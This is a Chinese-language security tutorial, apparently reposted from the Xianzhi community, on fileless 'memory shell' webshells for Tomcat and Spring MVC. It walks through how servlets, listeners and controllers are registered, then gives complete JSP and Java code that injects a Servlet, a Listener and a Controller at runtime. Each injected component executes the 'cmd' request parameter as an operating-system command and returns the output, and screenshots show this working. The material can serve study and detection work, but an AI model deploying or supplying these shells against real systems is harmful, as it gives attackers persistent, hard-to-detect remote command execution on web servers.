<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/11084)

> 先知社区，先知安全技术社区

Servlet 内存马
-----------

> web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0"
         metadata-complete="false"
>
    <!--注册Servlet-->
    <servlet>
        <servlet-name>hello</servlet-name>
        <servlet-class>com.naihe2.testServlet</servlet-class>
    </servlet>
    <!--Servlet的请求路径-->
    <servlet-mapping>
        <servlet-name>hello</servlet-name>
        <url-pattern>/hello</url-pattern>
    </servlet-mapping>
</web-app>


```

> testServlet

```
package com.naihe2;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class testServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.getWriter().write("123");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }


}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141040-ccd9797e-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141040-ccd9797e-a9a6-1.png)

### 分析 Servlet 生成

> 读取 web.xml  
> ContextConfig#webConfig()

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141044-cee633e2-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141044-cee633e2-a9a6-1.png)

在这里对其 xml 文件进行读取

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141050-d2970d04-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141050-d2970d04-a9a6-1.png)

ContextConfig#configureContext()

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141053-d497e29a-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141053-d497e29a-a9a6-1.png)

遍历 webxml 中的内容，将内容赋给新创建的 Wrapper

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141056-d6442e3c-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141056-d6442e3c-a9a6-1.png)

将类名添加到 Wrapper

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141100-d85b6f5a-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141100-d85b6f5a-a9a6-1.png)

将 Wrapper 添加到 context 中

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141104-daf81aec-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141104-daf81aec-a9a6-1.png)

StandardContext.createWapper()

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141108-dd4518e0-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141108-dd4518e0-a9a6-1.png)

在这里添加映射关系， 将 url 路径和 servlet 类做映射。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141111-df297c78-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141111-df297c78-a9a6-1.png)

### 加载 Servlet

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141114-e1265a0a-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141114-e1265a0a-a9a6-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141118-e3702692-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141118-e3702692-a9a6-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141121-e53ee13e-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141121-e53ee13e-a9a6-1.png)

遍历内容，比添加到 StandardContext 的 list 中

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141125-e7738270-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141125-e7738270-a9a6-1.png)

这里判断 loadOnStartup 是否大于 0，如果大于才会添加

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141128-e94e0908-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141128-e94e0908-a9a6-1.png)

standardWrapper 中的 loadOnStatup 默认为 - 1

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141132-eb6536c6-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141132-eb6536c6-a9a6-1.png)

在 servlet 的配置当中，<load-on-startup>1</load-on-startup > 的含义是：  
标记容器是否在启动的时候就加载这个 servlet。  
当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet；  
当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。  
正数的值越小，启动该 servlet 的优先级越高。</load-on-startup>

由于我们要注入内存马，且没有配置 xml 不会在应用启动时就加载这个 servlet，因此需要把优先级调至 1，让自己写的 servlet 直接被加载

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141137-ee7106b0-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141137-ee7106b0-a9a6-1.png)

遍历 list，加载 wrapper

### Servlet 内存马

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>$Title$</title>
  </head>
  <body>
  <%
    HttpServlet httpServlet = new HttpServlet() {
      @Override
      protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream is = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
        BufferedInputStream bis = new BufferedInputStream(is);
        int len;
        while ((len = bis.read())!=-1){
          resp.getWriter().write(len);
        }
      }

      @Override
      protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
      }
    };

    //获得StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext stdcontext = (StandardContext) req.getContext();

    //从StandardContext.createWapper()获得一个Wapper对象
    Wrapper newWrapper = stdcontext.createWrapper();
    String name = httpServlet.getClass().getSimpleName();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(httpServlet);
    newWrapper.setServletClass(httpServlet.getClass().getName());
    //将Wrapper添加到StandardContext
    stdcontext.addChild(newWrapper);
    stdcontext.addServletMappingDecoded("/demo", name);
  %>


```

</body>  
</html>

直接访问 demo 发现 404

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141143-f243976c-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141143-f243976c-a9a6-1.png)

访问 index.jsp 注入内存马

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141146-f428f40a-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141146-f428f40a-a9a6-1.png)

再次访问 demo

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322141149-f61441fc-a9a6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322141149-f61441fc-a9a6-1.png)

Listener 内存马
------------

### Listener 基础

#### 配置 Listener

```
package com.naihe2;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class testListener implements ServletRequestListener {

    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("这里是requestDestroyed");
    }

    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("这里是requestInitialized");
    }
}


```

#### xml 配置

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0"
         metadata-complete="false"
>

    <listener>
        <listener-class>com.naihe2.testListener</listener-class>
    </listener>

</web-app>


```

### 流程分析

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142233-75f07156-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142233-75f07156-a9a8-1.png)

#### 读取配置文件

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142238-78693918-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142238-78693918-a9a8-1.png)

读取 web.xml，处理后将信息存储在 webXml 中

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142241-7a87e672-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142241-7a87e672-a9a8-1.png)

配置 context

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142244-7c60a664-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142244-7c60a664-a9a8-1.png)

直接遍历并添加至 addApplication 中

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142247-7df5a0a6-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142247-7df5a0a6-a9a8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142250-7f7ff2dc-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142250-7f7ff2dc-a9a8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142253-819c9b38-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142253-819c9b38-a9a8-1.png)

以上步骤就是将 webxml 中的 listener 相关的数据添加到 ApplicationListener

接下来直接跟进到 listenerStart

#### 获取所有 listeners

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142256-8375feb8-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142256-8375feb8-a9a8-1.png)

反射生成了一个 testListener 对象，及我们自定义的 Listener

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142300-85c5b1ea-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142300-85c5b1ea-a9a8-1.png)

遍历 results 中的自定义 Listener 并添加到 eventListeners

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142303-87c357c2-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142303-87c357c2-a9a8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142308-8a5b0386-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142308-8a5b0386-a9a8-1.png)

将 eventListeners 中的内容添加到 applicationEventListenersList 属性中，而后期 tomcat 使用 Listener 会从 applicationEventListenersList 中取出

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142310-8bf57b86-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142310-8bf57b86-a9a8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142313-8d8f4ab2-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142313-8d8f4ab2-a9a8-1.png)

#### 调用过程

在自定义的 Listener 的 requestDestroyed 下断点

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142316-8f60f6d8-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142316-8f60f6d8-a9a8-1.png)

可以发现 tomcat 会自动调用 fireRequestDestroyEvent，因此我们进入 fireRequestDestroyEvent

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142320-915d0fb2-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142320-915d0fb2-a9a8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142322-92e8981a-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142322-92e8981a-a9a8-1.png)

这里直接获取 applicationEventListenersList 属性

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142324-943ed116-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142324-943ed116-a9a8-1.png)

遍历 applicationEventListenersList 并强制转为内容为 ServletRequestListener 类型

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142328-9628d404-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142328-9628d404-a9a8-1.png)

这里直接调用 requestDestroyed 方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142331-980dc59a-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142331-980dc59a-a9a8-1.png)

对应这自定义的 Listener

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142333-9982dbcc-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142333-9982dbcc-a9a8-1.png)

> 接下来如何动态添加 Listener  
> 在上面分析，tomcat 是将 web.xml 中的信息取出在调用 addApplication，将信息添加至 applicationListeners，然后再由 listenerStart 反射生成实例化的 Listener，并在需要调用前调用 fireRequestDestroyEvent，在间接调用 requestDestroyed 方法，但是分析了过程我们依旧无法主动添加 Listener 因为 applicationListeners 接收的是字符串而非一个对象。不过天无绝人之路，StandardContext 提供了另一个方法  
> addApplicationEventListener，可以直接添加一个 Lisener 对象到 applicationEventListenersList

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142337-9b8fec5c-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142337-9b8fec5c-a9a8-1.png)

由于 ServletRequestEvent 至提供了 ServletRequest，并没有提供 Response，因此需要通过反射获取 Response

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142341-9e25985e-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142341-9e25985e-a9a8-1.png)

### 内存马

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="org.apache.catalina.connector.Response" %>

<%!
    public class DemoListener implements ServletRequestListener{

        public void requestDestroyed(ServletRequestEvent sre) {
            org.apache.catalina.connector.RequestFacade req = (org.apache.catalina.connector.RequestFacade)sre.getServletRequest();
            Field requestField = null;
            try {
                requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
            requestField.setAccessible(true);
            Request request = null;
            try {
                request = (Request) requestField.get(req);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            Response response = request.getResponse();

            try {
                String cmd = request.getParameter("cmd");
                InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
                BufferedInputStream bis = new BufferedInputStream(is);
                int len;
                while ((len = bis.read())!=-1){
                    response.getWriter().write(len);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("这里是requestInitialized");
        }
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    DemoListener listener = new DemoListener();
    context.addApplicationEventListener(listener);
%>
</body>
</html>


```

### 效果展示

随便访问一个页面

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142348-a239589a-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142348-a239589a-a9a8-1.png)

在访问我们的内存马网页  
这里我由于代码没有判断 cmd 是否为空，所以必须输入东西才能正常访问，你懂的

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142350-a37cf3c4-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142350-a37cf3c4-a9a8-1.png)

再次访问之前不存在的网页

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220322142352-a5043edc-a9a8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220322142352-a5043edc-a9a8-1.png)

filter 内存马
----------

filter 内存马可以参考笔者这篇文章  
[https://xz.aliyun.com/t/10888](https://xz.aliyun.com/t/10888)

controller 内存马
--------------

### 搭建一个 sprint 项目

#### 配置 pom.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>springmvc</artifactId>
    <packaging>pom</packaging>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.12</version>
        </dependency> <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-webmvc</artifactId>
        <version>5.1.9.RELEASE</version>
    </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
        </dependency> <dependency>
        <groupId>javax.servlet.jsp</groupId>
        <artifactId>jsp-api</artifactId>
        <version>2.2</version>
    </dependency>
        <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>jstl</artifactId>
        <version>1.2</version>
    </dependency> </dependencies>
</project>


```

#### Demo

```
package com.naihe.controller;


import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class Cl1 {
    @RequestMapping("/cl1")
    public String hello(String name, Model model){
        model.addAttribute("msg",name);
        return "hello";
    }

}


```

#### 配置 web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app
        xmlns="http://xmlns.jcp.org/xml/ns/javaee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
        http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
        version="4.0">
    <!--1.注册servlet-->
    <servlet>
        <servlet-name>SpringMVC</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <!--通过初始化参数指定SpringMVC配置文件的位置，进行关联-->
        <init-param> <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc-servlet.xml</param-value>
        </init-param>
        <!-- 启动顺序，数字越小，启动越早 -->
        <load-on-startup>1</load-on-startup>
    </servlet>
    <!--所有请求都会被springmvc拦截 -->
    <servlet-mapping>
        <servlet-name>SpringMVC</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>
</web-app>


```

#### 配置 springmvc-servlet.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans
        xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:context="http://www.springframework.org/schema/context"
        xmlns:mvc="http://www.springframework.org/schema/mvc"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        https://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/mvc
        https://www.springframework.org/schema/mvc/spring-mvc.xsd">
    <!-- 自动扫描包，让指定包下的注解生效,由IOC容器统一管理 -->
    <context:component-scan base-package="com.naihe.controller"/>
    <!-- 让Spring MVC不处理静态资源 -->
    <mvc:default-servlet-handler />
    <!-- 支持mvc注解驱动 在spring中一般采用@RequestMapping注解来完成映射关系
    要想使@RequestMapping注解生效
    必须向上下文中注册DefaultAnnotationHandlerMapping
    和一个AnnotationMethodHandlerAdapter实例
    这两个实例分别在类级别和方法级别处理。
    而annotation-driven配置帮助我们自动完成上述两个实例的注入。 -->
    <mvc:annotation-driven />
    <!-- 视图解析器 -->
    <bean></bean>
    <bean></bean>
    <bean/>
    <bean>
        <!-- 前缀 --> <property />
        <!-- 后缀 -->
        <property  />
    </bean>


</beans>


```

#### 配置的位置

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201026-63ce1202-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201026-63ce1202-ab6b-1.png)

### 流程分析

#### 获取 context

```
第一种：getCurrentWebApplicationContext()
// getCurrentWebApplicationContext方法获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();

第二种：WebApplicationContextUtils
// 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());

第三种：RequestContextUtils
// 通过 ServletRequest 类的实例来获得 Child WebApplicationContextWebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

第四种：getAttribute
// 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext


```

#### 获取 RequestMappingHandlerMapping

```
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
虽然获取的是RequestMappingHandlerMapping类
但是RequestMappingHandlerMapping继承自AbstractHandlerMethodMapping
同样拥有register


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201033-67b87696-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201033-67b87696-ab6b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201037-6a73aac2-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201037-6a73aac2-ab6b-1.png)

#### 注册 Controller

这里主要是通过 register 进行注册 Controller

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201042-6d7573ae-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201042-6d7573ae-ab6b-1.png)

可以看到 register 方法的三个参数的类型

这里主要是映射关系，需要配置 url 和方法的方式

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201048-7107245e-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201048-7107245e-ab6b-1.png)

下面看一下 RequestMappingInfo 类

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201053-7395c18a-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201053-7395c18a-ab6b-1.png)

构造方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201058-76ebf584-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201058-76ebf584-ab6b-1.png)

handler 是一个 Object 类，及自定义的 Controller 类的实例对象

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201103-79b4a252-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201103-79b4a252-ab6b-1.png)

自定义的 Controller 类方法的 method 类

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201126-876d5e3e-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201126-876d5e3e-ab6b-1.png)

### 内存马

```
package com.naihe.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

@Controller
public class Demo {
    @ResponseBody
    @RequestMapping(value = "/inject", method = RequestMethod.GET)
    public void inject() throws NoSuchMethodException {
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method = InjectToController.class.getMethod("test");

        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/demo");

        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();

        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

        InjectToController injectToController = new InjectToController();
        mappingHandlerMapping.registerMapping(info, injectToController, method);
    }
    @ResponseBody
    public class InjectToController {
        public InjectToController(){
        }
        public String test() throws Exception {
            // 获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();

            InputStream is = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            InputStreamReader isr = new InputStreamReader(is, "UTF-8");
            BufferedReader br = new BufferedReader(isr);
            String str = "";
            String line = "";

            while ((line = br.readLine())!=null){
                str+=line;
            }
            is.close();
            br.close();
            return str;
        }
    }
}


```

### 效果

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201149-94efba2a-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201149-94efba2a-ab6b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201152-9724f7b0-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201152-9724f7b0-ab6b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201156-992a321e-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201156-992a321e-ab6b-1.png)

Interceptor 内存马
---------------

### interceptor 基础

#### 配置 springmvc-servlet.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans
        xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:context="http://www.springframework.org/schema/context"
        xmlns:mvc="http://www.springframework.org/schema/mvc"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        https://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/mvc
        https://www.springframework.org/schema/mvc/spring-mvc.xsd">
    <!-- 自动扫描包，让指定包下的注解生效,由IOC容器统一管理 -->
    <context:component-scan base-package="com.naihe.controller"/>
    <!-- 让Spring MVC不处理静态资源 -->
    <mvc:default-servlet-handler />
    <!-- 支持mvc注解驱动 在spring中一般采用@RequestMapping注解来完成映射关系
    要想使@RequestMapping注解生效
    必须向上下文中注册DefaultAnnotationHandlerMapping
    和一个AnnotationMethodHandlerAdapter实例
    这两个实例分别在类级别和方法级别处理。
    而annotation-driven配置帮助我们自动完成上述两个实例的注入。 -->
    <mvc:annotation-driven />
    <!-- 视图解析器 -->
    <bean></bean>
    <bean></bean>
    <bean/>
    <bean>
        <!-- 前缀 --> <property />
        <!-- 后缀 -->
        <property  />
    </bean>
    <mvc:interceptors>
        <mvc:interceptor>
            <!--            配置拦截器拦截路径-->
            <mvc:mapping path="/demo/*"/>
            <!--            注入自定义拦截器-->
            <bean/>
        </mvc:interceptor>
    </mvc:interceptors>


</beans>


```

#### Demo

```
package com.naihe.Interceptor;


import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MyInterceptor implements HandlerInterceptor {
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("拦截器执行");
        request.getRequestDispatcher("/WEB-INF/pages/error.jsp").forward(request,response);
        return true;
    }

    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        System.out.println("控制器执行后执行");
    }

    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("jsp页面执行后执行");
    }
}


```

hello

这里是后面内存马需要的可访问的页面

```
package com.naihe.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class hello {
    @ResponseBody
    @RequestMapping("/cl1")
    public String hello(String name, Model model){
        model.addAttribute("msg",name);
        return "hello";
    }

}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201220-a7b727ec-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201220-a7b727ec-ab6b-1.png)

